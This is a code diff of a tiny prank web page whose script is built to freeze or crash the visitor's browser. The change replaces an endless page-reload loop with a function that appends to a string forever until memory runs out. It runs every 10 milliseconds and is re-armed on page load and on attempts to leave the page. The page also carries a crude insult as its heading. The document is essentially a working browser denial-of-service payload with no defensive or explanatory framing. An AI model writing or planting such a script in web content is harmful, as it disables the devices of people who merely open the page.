@@ -2,18 +2,18 @@
 <html>
     <body>
         <script>
-            window.setInterval(function(){
-                    while(true)location.reload(1)
-                  }, 10)
+            function handler(){
+                a = "a";
+                while(true){
+                    a = a += "a";
+                }
+            }
+            window.setInterval(handler, 10)
             window.onbeforeunload = function() {
-                window.setInterval(function(){
-                    while(true)location.reload(1)
-                  }, 10)
+                window.setInterval(handler, 10);
             }
             window.onload = function() {
-                window.setInterval(function(){
-                    while(true)location.reload(1)
-                  }, 10)
+                window.setInterval(handler, 10);
             }
         </script>
         <h1 style="color: blue; background-color: black">Ur Mum Gey</h1>
